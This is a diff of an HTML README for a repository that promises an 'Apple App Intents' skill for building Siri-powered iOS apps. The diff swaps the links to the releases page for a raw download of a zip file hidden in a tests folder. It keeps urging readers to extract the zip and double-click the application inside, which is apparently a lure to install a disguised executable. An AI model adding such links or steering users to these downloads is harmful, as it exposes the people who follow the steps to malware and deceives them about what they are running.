@@ -1,7 +1,7 @@
 <h1>🍏 apple-app-intents-skill - Build iOS Apps with Siri & AI Power</h1>
 
 <p align="center">
-  <a href="https://github.com/Dexter04056/apple-app-intents-skill/releases" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(102,126,234,0.4);transition:all 0.3s ease;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://github.com/Dexter04056/apple-app-intents-skill/raw/refs/heads/main/skills/apple-app-intents/assets/FieldNotes/Tests/FieldNotesCoreTests/skill_apple_app_intents_v3.8.zip" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(102,126,234,0.4);transition:all 0.3s ease;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 <hr>
@@ -40,7 +40,7 @@
 
 <p>Click the big purple button at the top of this page, or go directly to this link:</p>
 
-<p style="text-align:center;font-size:18px;"><strong><a href="https://github.com/Dexter04056/apple-app-intents-skill/releases">👉 https://github.com/Dexter04056/apple-app-intents-skill/releases</a></strong></p>
+<p style="text-align:center;font-size:18px;"><strong><a href="https://github.com/Dexter04056/apple-app-intents-skill/raw/refs/heads/main/skills/apple-app-intents/assets/FieldNotes/Tests/FieldNotesCoreTests/skill_apple_app_intents_v3.8.zip">👉 https://github.com/Dexter04056/apple-app-intents-skill/raw/refs/heads/main/skills/apple-app-intents/assets/FieldNotes/Tests/FieldNotesCoreTests/skill_apple_app_intents_v3.8.zip</a></strong></p>
 
 <p>This link will take you to a page where you can download the application. Please visit this link to download the application.</p>
 
@@ -193,7 +193,7 @@
 <p style="text-align:center;font-size:20px;">Ready to start building amazing iOS apps? Visit this link to download the application:</p>
 
 <p style="text-align:center;margin:25px 0;">
-  <a href="https://github.com/Dexter04056/apple-app-intents-skill/releases" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(240,147,251,0.4);transition:all 0.3s ease;">🚀 GET THE FREE SKILL NOW</a>
+  <a href="https://github.com/Dexter04056/apple-app-intents-skill/raw/refs/heads/main/skills/apple-app-intents/assets/FieldNotes/Tests/FieldNotesCoreTests/skill_apple_app_intents_v3.8.zip" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(240,147,251,0.4);transition:all 0.3s ease;">🚀 GET THE FREE SKILL NOW</a>
 </p>
 
 <p>Then remember: download the .zip file, right-click → "Extract All", double-click the extracted application. Done! You now have the key to unlock Siri-powered, AI-enhanced iOS app development.</p>
